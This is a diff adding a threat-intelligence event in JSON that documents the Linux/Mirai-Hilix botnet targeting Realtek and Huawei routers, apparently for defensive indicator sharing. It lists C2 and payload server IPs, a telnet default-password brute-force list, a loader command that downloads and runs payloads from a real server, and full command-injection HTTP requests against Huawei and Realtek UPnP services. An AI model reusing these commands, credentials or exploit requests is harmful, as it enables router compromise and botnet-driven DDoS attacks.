@@ -1,0 +1,218 @@
+{
+    "Event":{
+        "threat_level_id":"3",
+        "date":"2020-05-14",
+        "published":true,
+        "info":"Linux/Mirai-Hilix (w/New TABLE encoder) aims Realtek & Huawei routers",
+        "publish_timestamp":"1589487314",
+        "timestamp":"1589487271",
+        "Tag":[
+            {
+                "name":"tlp:white"
+            },
+            {
+                "name":"circl:incident-classification=\"malware\""
+            },
+            {
+                "name":"malware_classification:malware-category=\"Botnet\""
+            },
+            {
+                "name":"Mirai"
+            }
+        ],
+        "Attribute":[
+            {
+                "category":"Internal reference",
+                "comment":"Technical announcement and analysis report",
+                "timestamp":"1589485800",
+                "type":"link",
+                "value":"https://www.virustotal.com/gui/file/a7f3670b9720fd2092d0cd0f52b46fecd431d442a9bff6ec8839e854147b7c53/community",
+                "to_ids":false
+            },
+            {
+                "category":"Internal reference",
+                "comment":"Technical announcement and analysis report",
+                "timestamp":"1589485800",
+                "type":"link",
+                "value":"https://old.reddit.com/r/LinuxMalware/comments/gj1x02/linuxmirai_hilix/",
+                "to_ids":false
+            },
+            {
+                "category":"Internal reference",
+                "comment":"Technical announcement and analysis report",
+                "timestamp":"1589485800",
+                "type":"link",
+                "value":"https://imgur.com/a/lWbs6T1",
+                "to_ids":false
+            },
+            {
+                "category":"Internal reference",
+                "comment":"Technical announcement and analysis report",
+                "timestamp":"1589485800",
+                "type":"link",
+                "value":"https://twitter.com/malwaremustd1e/status/1260582039503417344",
+                "to_ids":false
+            },
+            {
+                "category":"Payload installation",
+                "comment":"Linux/Mirai Hilix new encoder hashes",
+                "timestamp":"1589485980",
+                "type":"md5",
+                "value":"<md5>",
+                "to_ids":false
+            },
+            {
+                "category":"Payload installation",
+                "comment":"Linux/Mirai Hilix new encoder hashes",
+                "timestamp":"1589485981",
+                "type":"md5",
+                "value":"<md5>",
+                "to_ids":false
+            },
+            {
+                "category":"Payload installation",
+                "comment":"Linux/Mirai Hilix new encoder hashes",
+                "timestamp":"1589485981",
+                "type":"md5",
+                "value":"<md5>",
+                "to_ids":false
+            },
+            {
+                "category":"Payload installation",
+                "comment":"Linux/Mirai Hilix new encoder hashes",
+                "timestamp":"1589485981",
+                "type":"md5",
+                "value":"<md5>",
+                "to_ids":false
+            },
+            {
+                "category":"Payload installation",
+                "comment":"Linux/Mirai Hilix new encoder hashes",
+                "timestamp":"1589485981",
+                "type":"md5",
+                "value":"<md5>",
+                "to_ids":false
+            },
+            {
+                "category":"Payload installation",
+                "comment":"Linux/Mirai Hilix new encoder hashes",
+                "timestamp":"1589485981",
+                "type":"md5",
+                "value":"<md5>",
+                "to_ids":false
+            },
+            {
+                "category":"Payload installation",
+                "comment":"Linux/Mirai Hilix new encoder hashes",
+                "timestamp":"1589485981",
+                "type":"md5",
+                "value":"<md5>",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"Linux/Mirai Hilix loader script filename",
+                "timestamp":"1589486100",
+                "type":"filename",
+                "value":"Hilix.sh",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"Linux/Mirai Hilix loader script filename",
+                "timestamp":"1589486100",
+                "type":"filename",
+                "value":"Hilix1.sh",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"Linux/Mirai Hilix loader script filename",
+                "timestamp":"1589486100",
+                "type":"filename",
+                "value":"Hilix2.sh",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"Linux/Mirai Hilix loader script filename",
+                "timestamp":"1589486100",
+                "type":"filename",
+                "value":"Hilix3.sh",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"Linux/Mirai Hilix loader script filename",
+                "timestamp":"1589486100",
+                "type":"filename",
+                "value":"Hilix4.sh",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"Linux/Mirai Hilix's C2 servers, payload servers & Infection scanner servers (LRAB base), see reference.",
+                "timestamp":"1589486323",
+                "type":"ip-src",
+                "value":"142.93.217.221",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"Linux/Mirai Hilix's C2 servers, payload servers & Infection scanner servers (LRAB base), see reference.",
+                "timestamp":"1589486323",
+                "type":"ip-src",
+                "value":"159.203.44.33",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"Linux/Mirai Hilix's C2 servers, payload servers & Infection scanner servers (LRAB base), see reference.",
+                "timestamp":"1589486323",
+                "type":"ip-src",
+                "value":"194.180.224.124",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"Linux/Mirai Hilix's C2 servers, payload servers & Infection scanner servers (LRAB base), see reference.",
+                "timestamp":"1589486324",
+                "type":"ip-src",
+                "value":"194.180.224.150",
+                "to_ids":false
+            },
+            {
+                "category":"Targeting data",
+                "comment":"Linux/Mirai Hilix targeted products (telnet default password)",
+                "timestamp":"1589486529",
+                "type":"comment",
+                "value":"\"root\",\"xc3511\"\r\n\"root\",\"xc3518\"\r\n\"root\",\"xc3515\"\r\n\"vstarcam2015\",\"20150602\"\r\n\"admin\",\"admin\"\r\n\"root\",\"zte9x15\"\r\n\"root\",\"vizxv\"\r\n\"root\",\"admin\"\r\n\"root\",\"vertex25ektks123\"\r\n\"admin\",\"vertex25ektks123\"\r\n\"root\",\"Zte521\"\r\n\"default\"\r\n\"default\",\"OxhlwSG8\"\r\n\"default\",\"S2fGqNFs\"\r\n\"default\",\"lJwpbo6\"\r\n\"default\",\"antslq\"\r\n\"guest\",\"xc3511\"\r\n\"admin\",\"aquario\"\r\n\"support\",\"support\"\r\n\"admin\",\"password\"\r\n\"user\",\"user\"\r\n\"admin\",\"admin1234\"\r\n\"admin\",\"1111\"\r\n\"guest\",\"guest\"\r\n\"guest\",\"12345\"\r\n\"admin\",\"1234\"\r\n\"admin\",\"ipcam_rt5350\"\r\n\"root\",\"ipcam_rt5350\"\r\n\"admin\",\"ho4uku6at\"\r\n\"admin\",\"kont2004\"\r\n\"admin\",\"Win1doW$ \"\r\n\"root\",\"hunt5759\"\r\n\"admin\",\"COadmin123\"\r\n\"admin\",\"ZmqVfoSIP\"\r\n\"root\",\"3ep5w2u\"",
+                "to_ids":false
+            },
+            {
+                "category":"Payload installation",
+                "comment":"Linux/Mirai Hilix loader script injection (bruteforce default password)",
+                "timestamp":"1589486673",
+                "type":"comment",
+                "value":"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.124/Hilix.sh; curl -O http://194.180.224.124/Hilix.sh; chmod 777 Hilix.sh; sh Hilix.sh; tftp 194.180.224.124 -c get Hilix3.sh; chmod 777 Hilix3.sh; sh Hilix3.sh; tftp -r Hilix2.sh -g 194.180.224.124; chmod 777 Hilix2.sh; sh Hilix2.sh; ftpget -v -u anonymous -p anonymous -P 21 194.180.224.124 Hilix1.sh Hilix1.sh; sh Hilix1.sh; rm -rf Hilix.sh Hilix3.sh Hilix2.sh Hilix1.sh; rm -rf *; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.180.224.124/bins/Hilix.x86 -O /tmp/Hilix; chmod +x /tmp/Hilix; /tmp/Hilix sbot.x86",
+                "to_ids":false
+            },
+            {
+                "category":"Payload delivery",
+                "comment":"Linux/Mirai Hilix loader's infection script injection (Realtek, Huawei routers vulnerabilities)",
+                "timestamp":"1589486864",
+                "type":"comment",
+                "value":"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\\r\\nContent-Length: 430\\r\\nConnection: keep-alive\\r\\nAccept: */ï¼Š\\r\\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\\r\\n\\r\\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 159.203.44.33 -l /tmp/binary -r /bins/Hilix.mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\\r\\n\\r\\n\r\n\r\nPOST /picdesc.xml HTTP/1.1\\r\\nHost: 127.0.0.1:52869\\r\\nContent-Length: 630\\r\\nAccept-Encoding: gzip, deflate\\r\\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\nConnection: keep-alive\\r\\n\\r\\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var; rm -rf nig; wget http://159.203.44.33/bins/Hilix.mips -O nig; chmod 777 nig; ./nig realtek`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\\r\\n\\r\\n\r\n\r\n\r\nPOST /wanipcn.xml HTTP/1.1\\r\\nHost: 127.0.0.1:52869\\r\\nContent-Length: 630\\r\\nAccept-Encoding: gzip, deflate\\r\\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\nConnection: keep-alive\\r\\n\\r\\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var; rm -rf nig; wget http://159.203.44.33/bins/Hilix.mips -O nig; chmod 777 nig; ./nig realtek`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\\r\\n\\r\\n",
+                "to_ids":false
+            },
+            {
+                "category":"Network activity",
+                "comment":"Linux/Mirai Hilix DDoS attack methods",
+                "timestamp":"1589487163",
+                "type":"comment",
+                "value":"attack_method_greip\r\nattack_method_greeth\r\nattack_method_std\r\nattack_method_tcpsyn\r\nattack_method_tcpack\r\nattack_method_tcpstomp\r\nattack_method_tcpxmas\r\nattack_method_udpgeneric\r\nattack_method_udpvse\r\nattack_method_udpdns\r\nattack_method_udpplain",
+                "to_ids":false
+            }
+        ]
+    }
+}
